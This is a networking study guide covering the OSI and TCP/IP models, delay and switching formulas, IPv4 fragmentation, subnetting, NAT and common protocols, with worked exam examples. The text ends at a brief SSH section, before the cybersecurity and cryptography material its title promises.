# Networking and Cybersecurity Complete Guide

A reference document covering core networking concepts, protocols, hardware, cybersecurity, and cryptography, with interview questions and scenario-based questions.

---

# OSI Model

The OSI (Open Systems Interconnection) model is a 7-layer conceptual framework that standardizes how different network systems communicate.

#### Layer 7 - Application

Interfaces directly with end-user software. Protocols: HTTP, HTTPS, FTP, SMTP, DNS, DHCP.

#### Layer 6 - Presentation

Handles translation, encryption/decryption, and compression of data (e.g., SSL/TLS, JPEG, ASCII encoding).

#### Layer 5 - Session

Establishes, manages, and terminates sessions between two communicating hosts. Handles authentication and reconnection.

#### Layer 4 - Transport

Provides end-to-end communication, error recovery, and flow control. Protocols: TCP (reliable), UDP (fast, connectionless).

#### Layer 3 - Network

Handles logical addressing and routing of packets across networks. Protocols: IP, ICMP. Devices: Routers.

#### Layer 2 - Data Link

Handles physical addressing (MAC), framing, and error detection within the same network. Devices: Switches, Bridges. Sub-layers: LLC and MAC.

#### Layer 1 - Physical

Deals with the physical transmission of raw bits over a medium (cables, radio signals, connectors, voltages).

### Mnemonic

"Please Do Not Throw Sausage Pizza Away" (Physical, Data Link, Network, Transport, Session, Presentation, Application)

# TCP/IP Model

A more practical 4-layer model that the modern internet is actually built on.

#### Application Layer

Combines OSI's Application, Presentation, and Session layers. Protocols: HTTP, FTP, DNS, SMTP, Telnet, SSH.

#### Transport Layer

Same as OSI Layer 4. TCP and UDP operate here.

#### Internet Layer

Equivalent to OSI Layer 3. Handles addressing and routing (IP, ICMP, ARP).

#### Network Access (Link) Layer

Combines OSI Layers 1 and 2. Handles physical transmission and MAC addressing.

### OSI vs TCP/IP

| OSI | TCP/IP |
| --- | --- |
| 7 layers | 4 layers |
| Theoretical/reference model | Practical, implemented model |
| Strict layer separation | Layers combined |

# Principles of Layering

#### Why Layering

Networking is a complex problem, so it is broken into layers, each solving one problem. A layer uses the service of the layer below, offers a service to the layer above, and talks to its **peer** layer on the other machine using a **protocol**.

- **Service** is vertical (between adjacent layers on the same machine). **Protocol** is horizontal (between peer layers on different machines).
- Benefits: modularity, abstraction, easy replacement of one layer without touching the others, standardisation.
- Costs: header overhead at every layer, some duplicated functionality (for example error checking at both the link and transport layers), and extra processing.
- The TCP/IP model can also be drawn as a 5-layer hybrid: Application, Transport, Network, Link, Physical.

#### PDU and Delivery Scope of Each Layer

| OSI Layer | PDU (data unit) | Delivery scope |
| --- | --- | --- |
| 7 Application | Data / message | Application level |
| 6 Presentation | Data | Application level |
| 5 Session | Data | Application level |
| 4 Transport | Segment (TCP), datagram (UDP) | Process-to-process (end-to-end) |
| 3 Network | Packet / datagram | Host-to-host (source to destination) |
| 2 Data Link | Frame | Hop-to-hop (node-to-node) |
| 1 Physical | Bit | Raw bits on the medium |

#### Encapsulation

Application data, then TCP adds a header (20 to 60 B) to make a **segment**, then IP adds a header (20 to 60 B) to make a **datagram/packet**, then Ethernet adds a 14 B header and a 4 B trailer (FCS) to make a **frame**, then the frame is sent as **bits**. The receiver decapsulates in reverse order. **Only the data link layer adds a trailer.**

#### Addresses by Layer

| Layer | Address |
| --- | --- |
| Application | Domain name, URL, email address |
| Transport | Port number (16 bits) |
| Network | IP address (32 bits for IPv4) |
| Data link | MAC address (48 bits) |

The IP addresses stay the same from source to destination (except when NAT rewrites them). The MAC addresses change at every hop, because each router rewrites the link-layer header.

#### Devices, Collision Domains and Broadcast Domains

| Device | Layer | Collision domains | Broadcast domains |
| --- | --- | --- | --- |
| Repeater / hub | 1 | 1 (all ports share) | 1 |
| Bridge / L2 switch | 2 | One per port | 1 (VLANs split it) |
| Router | 3 | One per port | One per port |

#### Additional Port and Protocol Numbers (not listed elsewhere in this guide)

| Item | Number |
| --- | --- |
| FTP data connection | TCP 20 (control is 21) |
| TFTP | UDP 69 |
| BGP | TCP 179 |
| RIP | UDP 520 |
| OSPF | Runs directly over IP, protocol number 89 (no port) |
| ICMP, TCP, UDP | IP protocol numbers 1, 6, 17 |
| EtherType for IPv4 and ARP | 0x0800 and 0x0806 (ARP is carried directly inside the Ethernet frame) |

#### Layering Exam Traps

- **Hop-to-hop** means data link. **Host-to-host** means network. **Process-to-process** means transport.
- A switch does not modify MAC addresses. A router replaces the link-layer header at every hop.
- The IP checksum covers only the IP header. The TCP and UDP checksums cover header plus data plus a pseudo-header.
- Routing is a network-layer function. Congestion control is a transport-layer function (TCP). Flow control exists at both the link and transport layers.

# Bandwidth, Latency, and Throughput

#### Bandwidth

The maximum theoretical rate at which data can be transferred over a network connection, measured in bits per second (bps, Mbps, Gbps). Think of it as the width of a pipe.

#### Latency

The time delay between sending and receiving data, measured in milliseconds (ms). Caused by propagation delay, transmission delay, processing delay, and queuing delay.

#### Throughput

The actual amount of data successfully transferred over a connection in a given time. Always less than or equal to bandwidth due to overhead, congestion, and errors.

#### Jitter

Variation in latency over time, critical for real-time applications like VoIP and video calls.

### Quick Comparison

- Bandwidth = capacity of the pipe
- Throughput = actual water flowing through it
- Latency = how long it takes water to travel from one end to the other

# Delay Components and Performance Formulas

Nodal delay = processing + queuing + transmission + propagation.

#### The Four Delay Components

- **Transmission delay** Tt = L / B (packet length in bits divided by link bandwidth). The time to push all bits onto the link.
- **Propagation delay** Tp = d / v (distance divided by signal speed). Speed is about 2 x 10^8 m/s in copper and fibre, 3 x 10^8 m/s in vacuum or air. It does **not** depend on packet size or bandwidth.
- **Queuing delay** depends on traffic. With traffic intensity rho = (packet arrival rate x L) / B: rho near 0 gives almost no queue, rho near 1 gives huge delay, and rho above 1 means the queue grows without bound. For an M/M/1 queue the average time in system is 1 / (mu - lambda).
- **Processing delay** is header inspection and routing lookup, usually microseconds.

#### Additional Performance Metrics

- **Throughput of a path = the minimum link rate (the bottleneck)**. Transfer time of a file of F bits = F / throughput.
- **Goodput** is the useful application data rate, excluding headers and retransmissions.
- **Bandwidth-delay product (BDP)** = bandwidth x delay, the number of bits that fit in the link pipe. With one-way delay it gives bits in the forward pipe. With RTT it gives the data that must be in flight to keep the link fully busy.
- **Utilisation** = useful transmission time / total time.

#### Notation Used in Exam Problems

Tt = transmission delay, Tp = propagation delay, **a = Tp / Tt**, RTT = 2 x Tp (when queuing and processing are ignored). Link rates use decimal units (1 Kbps = 10^3 bps, 1 Mbps = 10^6 bps, 1 Gbps = 10^9 bps). Data sizes use KB = 2^10 bytes unless the question says otherwise.

#### Exam Traps

- Propagation delay does not change when you change packet size. Transmission delay does.
- Count links versus routers carefully: k links means k - 1 intermediate nodes.
- Throughput of a path is the **minimum** link rate, not the sum or average.
- Check whether a question uses 1 KB = 1000 or 1024 bytes and whether a rate is in bits or bytes per second.

# Packet Switching vs Circuit Switching

#### Circuit Switching

A dedicated communication path is established between sender and receiver for the entire session (e.g., traditional telephone networks). Resources are reserved even during idle time, guaranteeing consistent bandwidth but wasting capacity.

#### Packet Switching

Data is broken into packets, each routed independently and possibly via different paths, then reassembled at the destination. Used by the modern internet. More efficient use of bandwidth, but can suffer from variable latency and out-of-order delivery.

### Comparison

| Circuit Switching | Packet Switching |
| --- | --- |
| Dedicated path | Shared path, dynamic routing |
| Fixed bandwidth reserved | Bandwidth shared/used on demand |
| Low flexibility | High flexibility |
| Example: PSTN phone calls | Example: Internet, IP networks |

# Switching In Depth: Datagram, Virtual Circuit, Message Switching and Store-and-Forward Formulas

#### Circuit Switching Details

- **Three phases:** connection setup, data transfer, teardown.
- Resources (bandwidth, time slots) are reserved for the whole call, using **FDM or synchronous TDM**.
- No queuing and no store-and-forward during transfer, so delay is constant and data arrives in order. A call can be blocked (busy signal) if no capacity is free.
- Total time = setup time + Tt of the message + propagation delay (Tt is paid only once, since there is no store-and-forward).

#### Packet Switching Details

Packets share links on demand (**statistical multiplexing**). Each switch **stores the whole packet, then forwards** it (store-and-forward).

**Datagram (connectionless) packet switching**

- No setup. Every packet carries the full destination address and is routed independently.
- Packets can take different paths, so they may arrive out of order, duplicated or lost.
- Routers keep a forwarding table keyed by destination address. Survives link failures better because packets can be rerouted. Example: the IP network.

**Virtual circuit (connection-oriented) packet switching**

- A setup phase fixes the path and assigns a **VCI** (virtual circuit identifier) on each link. Packets carry only the short VCI, not the full address.
- Each switch has a VC table: (incoming port, incoming VCI) maps to (outgoing port, outgoing VCI). The VCI is **swapped at each hop**.
- Packets follow the same path, so they arrive in order. Resources can be reserved, which allows quality of service.
- If a switch on the path fails, the circuit breaks. Setup costs one RTT before data flows.
- **PVC** is set up manually and is permanent. **SVC** is set up on demand. Examples: ATM, Frame Relay, X.25, MPLS-like label switching.

**Message switching** is store-and-forward of the entire message, with no packetisation. It is the worst case for delay.

#### Circuit vs Datagram vs Virtual Circuit

| Feature | Circuit | Datagram | Virtual circuit |
| --- | --- | --- | --- |
| Setup phase | Yes | No | Yes |
| Path | Fixed, dedicated | Per packet | Fixed per connection |
| Address in packet | None (after setup) | Full destination address | Short VCI |
| Order | In order | May be out of order | In order |
| Resource use | Reserved, can waste | On demand | On demand or reserved |
| Congestion | Only at setup (busy signal) | Any time | Can be avoided at setup |
| Store-and-forward | No | Yes | Yes |

#### Store-and-Forward Formulas (very high yield)

Let a message of L bits cross **k links** (so k - 1 intermediate switches), each of rate B. Ignore propagation unless told otherwise.

- **Message switching** (one big packet): total time = k x L / B.
- **Packet switching**, message split into n packets of p bits each (L = n x p): the first packet needs k x p / B, and each of the other n - 1 packets finishes p / B later. So total time = (k + n - 1) x p / B.
- **With header h per packet:** each packet is (p + h) bits and n = L / p, so total time = (k + n - 1) x (p + h) / B, plus k x Tp if propagation counts.
- **Optimal data size per packet** (minimise the time above): p\_opt = sqrt( L x h / (k - 1) ).
- **Circuit switching:** setup time + L / B + total propagation.

**Worked example.** A 10^6-bit message crosses 3 links of 1 Mbps. Message switching takes 3 x 1 = 3 s. With packets of 10^4 bits (n = 100, ignore headers): (3 + 100 - 1) x 10^4 / 10^6 = 1.02 s. Packetisation gives pipelining.

**Worked example (circuit vs packet capacity).** A 1 Mbps link is shared by users who each need 100 Kbps when active and are active 10% of the time. Circuit switching supports 10 users. Packet switching can support many more (35 users gives probability about 0.0004 that more than 10 are active together), which is the benefit of statistical multiplexing.

#### Switching Exam Traps

- In circuit switching you pay Tt once (no store-and-forward). In packet switching you pay Tt at every hop for each packet.
- Datagram packets carry the full destination address. Virtual circuit packets carry only a VCI that changes hop by hop.

# IPv4

A 32-bit address, written in dotted decimal notation (e.g., 192.168.1.1), giving about 4.3 billion unique addresses.

#### Structure

Divided into Network portion and Host portion, determined by the subnet mask.

#### Address Classes

| Class | Range | Default Mask | Use |
| --- | --- | --- | --- |
| A | 1.0.0.0 - 126.255.255.255 | /8 | Large networks |
| B | 128.0.0.0 - 191.255.255.255 | /16 | Medium networks |
| C | 192.0.0.0 - 223.255.255.255 | /24 | Small networks |
| D | 224.0.0.0 - 239.255.255.255 | N/A | Multicast |
| E | 240.0.0.0 - 255.255.255.255 | N/A | Experimental |

#### Special Addresses

- 127.0.0.1 - Loopback
- 0.0.0.0 - Unspecified/default route
- 255.255.255.255 - Limited broadcast
- 169.254.x.x - APIPA (Automatic Private IP Addressing)

# IPv4 Header, Classful Details and Fragmentation

#### IPv4 Header Format

| Field | Size | Notes |
| --- | --- | --- |
| Version | 4 bits | 4 |
| IHL (header length) | 4 bits | Counted in **32-bit words**. Minimum 5 (20 B), maximum 15 (60 B) |
| Type of service / DSCP | 8 bits | Quality of service |
| Total length | 16 bits | Header + data in bytes, maximum 65,535 |
| Identification | 16 bits | Same for all fragments of one datagram |
| Flags | 3 bits | Reserved, **DF** (don't fragment), **MF** (more fragments) |
| Fragment offset | 13 bits | Position of the fragment's data, in **units of 8 bytes** |
| TTL | 8 bits | Decremented at every router, discard at 0 |
| Protocol | 8 bits | 1 ICMP, 6 TCP, 17 UDP, 89 OSPF |
| Header checksum | 16 bits | Header only, **recomputed at every router** because TTL changes |
| Source address | 32 bits |  |
| Destination address | 32 bits |  |
| Options | 0 to 40 B | Padded to a multiple of 4 B |

Maximum data in one datagram = 65,535 - 20 = 65,515 bytes.

#### Classful Addressing Details

| Class | First bits | First octet | Default mask | Hosts per network |
| --- | --- | --- | --- | --- |
| A | 0 | 0 to 127 (0 and 127 are reserved) | /8 | 2^24 - 2 |
| B | 10 | 128 to 191 | /16 | 2^16 - 2 |
| C | 110 | 192 to 223 | /24 | 2^8 - 2 = 254 |
| D (multicast) | 1110 | 224 to 239 | none | none |
| E (reserved) | 1111 | 240 to 255 | none | none |

**Hosts per network = 2^h - 2**, because the all-0 host part is the network address and the all-1 host part is the **directed broadcast** address. 255.255.255.255 is the limited broadcast and is never forwarded by a router.

#### Fragmentation

Each link has an **MTU** (the largest IP datagram it can carry, for example 1500 B for Ethernet). A datagram larger than the MTU is split into fragments.

Rules:

- Every fragment is a complete datagram with its own IP header (header copied, with length, offset, MF and checksum changed).
- **Data in each fragment except the last must be a multiple of 8 bytes**, because the offset is in 8-byte units. Maximum data per fragment = floor((MTU - header length) / 8) x 8.
- **Fragment offset = (byte position of the fragment's first data byte) / 8.**
- MF = 1 on every fragment except the last. DF = 1 forbids fragmentation: the router drops the datagram and sends an ICMP "fragmentation needed" message (used for **Path MTU Discovery**).
- **Reassembly happens only at the destination host**, never at routers. Fragments can be fragmented again on a smaller-MTU link.
- If any fragment is lost, the whole datagram is discarded after the reassembly timeout, and the sender must resend the entire datagram.

**Worked example 1.** A datagram of total length 4000 B (20 B header + 3980 B data) crosses a link with MTU 1500. Maximum data per fragment = floor(1480 / 8) x 8 = 1480. Number of fragments = ceil(3980 / 1480) = 3.

| Fragment | Data | Total length | Offset | MF |
| --- | --- | --- | --- | --- |
| 1 | 1480 | 1500 | 0 | 1 |
| 2 | 1480 | 1500 | 185 | 1 |
| 3 | 1020 | 1040 | 370 | 0 |

**Worked example 2 (re-fragmentation).** Fragment 2 above (1480 B data, offset 185, MF = 1) now meets a link with MTU 700. Maximum data per fragment = floor(680 / 8) x 8 = 680. So 1480 = 680 + 680 + 120. The new offsets are 185, 185 + 85 = 270 and 270 + 85 = 355. The MF bit is **1 on all three**, including the last piece, because the original fragment had MF = 1 (more data follows in fragment 3). Total lengths are 700, 700 and 140.

#### Supporting Protocol Details (ARP, DHCP, ICMP)

- **ARP:** the sender **broadcasts** an ARP request (who has IP X?) and the owner **unicasts** a reply. Results are cached with a timeout. ARP is carried directly in Ethernet frames (EtherType 0x0806).
- **DHCP:** the first message (Discover) is sent from 0.0.0.0 to the broadcast address 255.255.255.255, and the address is leased for a limited time.
- **ICMP types:** 0 echo reply, 8 echo request (ping), 3 destination unreachable, 11 time exceeded, 5 redirect. **Traceroute** sends packets with TTL = 1, 2, 3 and so on, and reads the time-exceeded replies from each router on the path. No ICMP error is sent about an ICMP error message.

#### IPv4 Exam Traps

- Fragment offsets are in **8-byte units**, and the data size of non-last fragments must be a multiple of 8.
- Fragment max data uses MTU **minus header** (20 B unless options are present).
- The last fragment of a re-fragmented fragment keeps **MF = 1** if the fragment it came from had MF = 1.
- Usable hosts are 2^h - 2. The network and broadcast addresses cannot be assigned.
- Fragments are reassembled only at the final destination.
- The IPv4 header checksum is recomputed at every router. TTL decrement is the reason.

# IPv6

A 128-bit address written in 8 groups of hexadecimal digits separated by colons (e.g., 2001:0db8:85a3:0000:0000:8a2e:0370:7334), designed to solve IPv4 exhaustion.

#### Key Features

- Massively larger address space (\~340 undecillion addresses)
- No need for NAT
- Built-in IPsec support
- Simplified header for faster routing
- Auto-configuration (SLAAC)
- No broadcast; uses multicast and anycast instead

#### Address Types

- Unicast: one-to-one
- Multicast: one-to-many
- Anycast: one-to-nearest

#### Shorthand Rules

Leading zeros in a group can be omitted, and one sequence of consecutive all-zero groups can be replaced with `::` (only once per address).

### IPv4 vs IPv6

| IPv4 | IPv6 |
| --- | --- |
| 32-bit | 128-bit |
| 8 (bits per octet) × 4 (octets) = 32 | 16 (bits per group) × 8 (groups) = 128 |
| Dotted decimal notation | Hexadecimal colon notation |
| NAT commonly required | NAT generally unnecessary |
| No native IPsec | IPsec built-in |

GATE additions: IPv6 has a fixed 40-byte header, no header checksum, and routers do not fragment packets (only the source host fragments, after Path MTU Discovery).

# Subnetting

Subnetting divides a large network into smaller, more manageable sub-networks (subnets) by borrowing bits from the host portion of an IP address.

#### Why Subnet

- Reduces broadcast traffic
- Improves security through segmentation
- Efficient IP address utilization
- Easier network management

#### Key Concepts

- **Subnet Mask**: Defines which bits represent the network vs the host (e.g., `255.255.255.0 = /24`).
- **CIDR Notation**: Shorthand like `/24`, `/26`, indicating the number of network bits.
- **Binary Subnetting**: Converting the subnet mask and IP to binary to calculate network address, broadcast address, and valid host range.

#### CIDR Maths

For IPv4:

- Total bits = **32**
- Network bits = **CIDR prefix**
- Host bits = **32 - CIDR prefix**

| Calculation | Formula | Example `/26` |
| --- | --- | --- |
| Network bits | CIDR prefix | `26` |
| Host bits | `32 - prefix` | `32 - 26 = 6` |
| Total IP addresses | `2^(host bits)` | `2^6 = 64` |
| Usable host addresses | `2^(host bits) - 2` | `64 - 2 = 62` |
| Network address | First IP in subnet | `192.168.1.0` |
| Broadcast address | Last IP in subnet | `192.168.1.63` |
| Usable host range | Network + 1 → Broadcast - 1 | `192.168.1.1 - 192.168.1.62` |

> **Note:** The `-2` accounts for the **network address** and **broadcast address**. This traditional calculation applies to normal IPv4 subnets such as `/24` through `/30`. `/31` and `/32` have special uses.

#### CIDR Quick Reference

| CIDR | Host Bits | Total IPs | Usable Hosts |
| --- | --: | --: | --: |
| `/16` | 16 | `2^16 = 65,536` | `65,534` |
| `/17` | 15 | `2^15 = 32,768` | `32,766` |
| `/18` | 14 | `2^14 = 16,384` | `16,382` |
| `/19` | 13 | `2^13 = 8,192` | `8,190` |
| `/20` | 12 | `2^12 = 4,096` | `4,094` |
| `/21` | 11 | `2^11 = 2,048` | `2,046` |
| `/22` | 10 | `2^10 = 1,024` | `1,022` |
| `/23` | 9 | `2^9 = 512` | `510` |
| `/24` | 8 | `2^8 = 256` | `254` |
| `/25` | 7 | `2^7 = 128` | `126` |
| `/26` | 6 | `2^6 = 64` | `62` |
| `/27` | 5 | `2^5 = 32` | `30` |
| `/28` | 4 | `2^4 = 16` | `14` |
| `/29` | 3 | `2^3 = 8` | `6` |
| `/30` | 2 | `2^2 = 4` | `2` |
| `/31` | 1 | `2^1 = 2` | Point-to-point\* |
| `/32` | 0 | `2^0 = 1` | Single address\* |

- `/31` is commonly used for point-to-point links, where both addresses can be used. `/32` represents a single IPv4 address.

#### Example

Given `192.168.1.0/26`:

**Step 1 — Find host bits**

```text
Host bits = 32 - 26
          = 6
```

**Step 2 — Calculate total IP addresses**

```text
Total IPs = 2^6
          = 64
```

**Step 3 — Calculate usable hosts**

```text
Usable hosts = 2^6 - 2
             = 64 - 2
             = 62
```

**Step 4 — Calculate subnet increment**

The subnet mask for `/26` is `255.255.255.192`.

```text
Increment = 256 - 192
          = 64
```

Therefore, the subnets are:

```text
192.168.1.0/26
192.168.1.64/26
192.168.1.128/26
192.168.1.192/26
```

For `192.168.1.0/26`:

```text
Network   = 192.168.1.0
First host = 192.168.1.1
Last host  = 192.168.1.62
Broadcast = 192.168.1.63
```

#### Formulae

| Requirement | Formula |
| --- | --- |
| IPv4 total bits | `32` |
| Host bits | `32 - CIDR prefix` |
| Network bits | `CIDR prefix` |
| Total IP addresses | `2^(host bits)` |
| Usable IPv4 hosts | `2^(host bits) - 2` |
| Subnet increment | `256 - subnet mask value` |
| Number of subnets | `2^(borrowed bits)` |
| Borrowed bits | `New prefix - Original prefix` |

#### Number of Subnets Example

Given a `/24` network split into `/26`:

```text
Borrowed bits = 26 - 24
              = 2
```

```text
Number of subnets = 2^2
                  = 4
```

Each `/26` subnet contains:

```text
Host bits = 32 - 26
          = 6

Total IPs = 2^6
          = 64

Usable hosts = 64 - 2
             = 62
```

So:

| Original Network | New CIDR | Borrowed Bits | Number of Subnets | IPs per Subnet | Usable Hosts |
| --- | --: | --: | --: | --: | --: |
| `/24` | `/26` | `2` | `2^2 = 4` | `2^6 = 64` | `62` |

#### VLSM (Variable Length Subnet Masking)

Allows subnets of different sizes within the same network, optimizing address allocation instead of using one fixed mask everywhere.

For example, a `/24` network can be divided into `/26`, `/27`, and `/28` subnets depending on the number of hosts required.

# CIDR Aggregation, Longest Prefix Match and Packet Delivery

#### Network and Broadcast Address Rules

- **Network address = IP AND mask.** **Broadcast address = network address OR (NOT mask).**
- First usable = network + 1. Last usable = broadcast - 1.

*Example A.* 192.168.10.77/26. The mask is 255.255.255.192, block size 64, and 77 lies in 64 to 127. Network = 192.168.10.64, broadcast = 192.168.10.127, usable hosts 192.168.10.65 to .126 (62 hosts).

*Example B.* 172.16.35.130/20. The mask is 255.255.240.0. In the third octet 35 AND 240 = 32, so the network = 172.16.32.0 and the broadcast = 172.16.47.255. Usable hosts = 4094.

*Example C.* 192.168.5.130/27. The mask is 255.255.255.224 and the block size is 32. 130 lies in 128 to 159, so network = 192.168.5.128, broadcast = 192.168.5.159, usable range .129 to .158 (30 hosts).

#### VLSM Worked Allocation

From 200.100.50.0/24 allocate subnets needing 100, 50, 20 and 10 hosts. Allocate the largest first:

| Need | Prefix | Range |
| --- | --- | --- |
| 100 hosts | /25 (126) | 200.100.50.0 to .127 |
| 50 hosts | /26 (62) | 200.100.50.128 to .191 |
| 20 hosts | /27 (30) | 200.100.50.192 to .223 |
| 10 hosts | /28 (14) | 200.100.50.224 to .239 |

#### Route Aggregation (Supernetting)

Several contiguous blocks can be advertised as one prefix if (1) they are contiguous, (2) the number of blocks is a power of 2, and (3) the first address is divisible by the total aggregate size. Example: 200.1.0.0/24, 200.1.1.0/24, 200.1.2.0/24 and 200.1.3.0/24 aggregate to **200.1.0.0/22**. The blocks 200.1.1.0/24 to 200.1.4.0/24 do **not** aggregate into one /22, because 1 is not divisible by 4.

#### Forwarding Rule: Longest Prefix Match

A router compares the destination against every table entry (using each entry's mask) and picks the matching entry with the **longest prefix**. A default route 0.0.0.0/0 matches everything with length 0.

*Example.* Destination 135.46.57.14. Entry 135.46.56.0/22: mask 255.255.252.0, and 57 AND 252 = 56, so it matches. Entry 135.46.60.0/22: 57 AND 252 = 56, not 60, so it does not match. The first entry is the longest match and wins. Another example: with entries 10.0.0.0/8, 10.1.0.0/16 and 10.1.2.0/24, the address 10.1.2.77 matches all three and goes to the /24 entry, while 10.1.3.5 matches only the /8 and /16 entries and goes to the /16 entry.

#### Delivery Rule for a Host

The host ANDs the destination IP with its own mask. If the result equals its own network address, the destination is on the same subnet, so it uses ARP to find the destination's MAC. Otherwise it sends the frame to the **default gateway's MAC**, while the IP destination stays the final destination.

#### CIDR Exam Traps

- Always compute the block size from the mask, then find which block holds the address.
- Longest prefix match, not first match and not lowest metric, selects the route.

# Private vs Public IP Addresses

#### Private IP

Used within internal networks (LAN); not routable on the public internet.

Private ranges (RFC 1918):

- 10.0.0.0 - 10.255.255.255 (/8)
- 172.16.0.0 - 172.31.255.255 (/12)
- 192.168.0.0 - 192.168.255.255 (/16)

#### Public IP

Globally unique and routable on the internet, assigned by ISPs or regional internet registries (ARIN, RIPE, APNIC).

# NAT and PAT

#### NAT (Network Address Translation)

Translates private IP addresses to a public IP address (and vice versa) so internal devices can communicate with the internet using a shared public address.

**Types of NAT:**

- Static NAT: One-to-one fixed mapping
- Dynamic NAT: Maps private IPs to a pool of public IPs
- PAT (overload): Many-to-one mapping using port numbers

#### PAT (Port Address Translation)

A form of dynamic NAT that maps multiple private IP addresses to a single public IP address, differentiating sessions using unique source port numbers. Also called "NAT Overload." This is what most home routers use.

# NAT Operation in Detail

#### Translation Table

A NAT/PAT router keeps a translation table.

- **Outgoing packet:** the router replaces source (private IP, port) with (public IP, new unique port) and records the mapping, for example (10.0.0.5, 3345) to (203.0.113.9, 5001).
- **Incoming packet:** the router looks up the **destination port** in the table, replaces destination (public IP, port) with the original (private IP, port), and forwards it inside.
- The router also recomputes the **IP header checksum and the TCP/UDP checksum** (the latter covers addresses through the pseudo-header).
- The 16-bit port field allows about 60,000 simultaneous connections through one public address.
- If two inside hosts (10.0.0.2 and 10.0.0.3) both use source port 5000 to the same server, NAT gives each connection a different public source port (for example 5001 and 5002) and uses the destination port of the reply to map it back.

#### Problems with NAT

- A host behind NAT cannot receive unsolicited connections (needs static mapping or port forwarding).
- It breaks end-to-end addressing, and a router now modifies transport-layer data (a layer violation).
- It complicates peer-to-peer applications, IPsec, and protocols that embed IP addresses in the payload (such as FTP).
- The lasting fix is **IPv6** (128-bit addresses, so NAT is not needed).

# Protocols

A **network protocol** is a set of rules that defines how devices communicate and exchange data over a network. Protocols specify things such as **how data is formatted, addressed, transmitted, received, acknowledged, and secured**.

Different protocols operate at different layers of the networking stack and serve different purposes. For example, **TCP** provides reliable data delivery, **DNS** resolves domain names to IP addresses, **HTTP/HTTPS** transfers web content, and **ARP** maps IP addresses to MAC addresses on a local network.

#### TCP (Transmission Control Protocol)

TCP is a **connection-oriented and reliable transport-layer protocol**. It establishes a connection between two devices before transmitting application data and ensures that data arrives **reliably, in order, and without duplication**.

TCP achieves reliability using:

- **Sequence numbers** — identify the position of data in the byte stream.
- **Acknowledgments (ACKs)** — confirm that data was received.
- **Retransmission** — resends data if it is lost.
- **Checksum** — detects corrupted data.
- **Flow control** — prevents a sender from overwhelming the receiver.
- **Congestion control** — adjusts transmission speed based on network conditions.

**Three-Way Handshake:**

1. **SYN** — client requests a connection.
2. **SYN-ACK** — server acknowledges the request and responds.
3. **ACK** — client confirms; the connection is established.

**Four-Way Termination:**

1. **FIN** — one side requests to close its connection.
2. **ACK** — other side acknowledges.
3. **FIN** — other side closes its connection.
4. **ACK** — final acknowledgment.

**Common uses:**

- HTTP/HTTPS
- SSH
- FTP
- SMTP
- IMAP

TCP is preferred when **reliable and ordered delivery** is more important than minimum latency.

#### UDP (User Datagram Protocol)

UDP is a **connectionless transport-layer protocol**. Unlike TCP, it does not establish a connection or guarantee that packets will arrive.

UDP provides:

- No connection establishment
- No delivery guarantee
- No ordering guarantee
- No retransmission
- Low protocol overhead
- Low latency

The application sends **datagrams** without waiting for acknowledgments from the receiver.

Because UDP does not spend time establishing connections, acknowledging packets, or retransmitting lost data, it is useful for applications where **speed and low latency are more important than perfect delivery**.

**Common uses:**

- DNS
- DHCP
- VoIP
- Live video/audio streaming
- Online gaming

For example, losing one video frame during a live stream may be preferable to waiting for retransmission and causing additional delay.

#### TCP vs UDP

| TCP | UDP |
| --- | --- |
| Connection-oriented | Connectionless |
| Reliable delivery | No delivery guarantee |
| Ordered delivery | No ordering guarantee |
| Uses acknowledgments | No acknowledgments |
| Retransmits lost data | Does not retransmit |
| Higher overhead | Lower overhead |
| Generally higher latency | Generally lower latency |
| Flow and congestion control | No built-in flow/congestion control |
| Best when reliability matters | Best when speed/latency matters |

#### HTTP (Hypertext Transfer Protocol)

HTTP is an **application-layer protocol** used to transfer web resources between clients and servers.

A typical HTTP communication works like this:

```text
Client → HTTP Request → Web Server
Client ← HTTP Response ← Web Server
```

An HTTP request can contain:

- **Method** — such as `GET`, `POST`, `PUT`, or `DELETE`.
- **URL/path** — identifies the requested resource.
- **Headers** — provide additional information.
- **Body** — carries data when required.

The server responds with:

- **Status code** — such as `200`, `404`, or `500`.
- **Headers**
- **Response body**

**Common port:** `80`

HTTP itself does not provide encryption. For secure web communication, **HTTPS** is used.

**Common uses:**

- Websites
- Web APIs
- REST APIs
- Communication between web browsers and servers

#### HTTPS (HTTP Secure)

HTTPS is HTTP transmitted over **TLS (Transport Layer Security)**.

It provides:

- **Encryption** — protects data from being read in transit.
- **Authentication** — helps verify that the client is communicating with the intended server.
- **Integrity** — helps detect tampering with transmitted data.

**Common port:** `443`

A simplified connection looks like:

```text
Client
  ↓
TLS handshake
  ↓
Encrypted HTTP communication
  ↓
Web Server
```

HTTPS is used for websites, APIs, login pages, online banking, e-commerce, and other applications where data should be protected.

#### DNS (Domain Name System)

DNS translates **domain names into IP addresses** so that clients can locate servers.

For example:

```text
www.example.com
       ↓
DNS lookup
       ↓
93.184.216.34
```

Without DNS, users would generally need to remember IP addresses instead of domain names.

DNS commonly uses:

- **UDP port 53** for normal queries.
- **TCP port 53** for cases such as larger responses and DNS zone transfers.

Common DNS record types include:

| Record | Purpose |
| --- | --- |
| `A` | Maps a domain to an IPv4 address |
| `AAAA` | Maps a domain to an IPv6 address |
| `CNAME` | Alias for another domain name |
| `MX` | Specifies mail servers |
| `NS` | Specifies authoritative name servers |
| `TXT` | Stores text information, often used for verification/security |

**Example:**

```text
example.com
     ↓
DNS Resolver
     ↓
DNS Server
     ↓
192.0.2.10
```

#### DHCP (Dynamic Host Configuration Protocol)

DHCP automatically provides network configuration to devices when they join a network.

A DHCP server can provide:

- IP address
- Subnet mask
- Default gateway
- DNS server
- Lease duration

The typical DHCP process is called **DORA**:

1. **Discover** — client broadcasts a request for a DHCP server.
2. **Offer** — DHCP server offers an IP configuration.
3. **Request** — client requests the offered configuration.
4. **ACK** — server confirms the assignment.

**Ports:**

- DHCP server: `UDP 67`
- DHCP client: `UDP 68`

Without DHCP, devices would need to be manually configured with network settings.

#### FTP (File Transfer Protocol)

FTP is an application-layer protocol used to **transfer files between a client and a server**.

FTP supports operations such as:

- Uploading files
- Downloading files
- Listing directories
- Creating directories
- Renaming files
- Deleting files

**Control connection:** `TCP 21`

Traditional FTP does **not encrypt credentials or file contents**, making it unsuitable for sensitive communication over untrusted networks.

#### SFTP (SSH File Transfer Protocol)

SFTP provides secure file transfer through **SSH**.

It encrypts:

- Authentication credentials
- Commands
- File contents
- Directory information

**Common port:** `TCP 22`

SFTP should not be confused with **FTPS**, which is FTP secured using TLS. SFTP is a separate protocol that operates through SSH.

#### SSH (Secure Shell)

SSH is a secure protocol used for **remote login, command execution, and secure file transfer**.

It encrypts communication between the client and server.

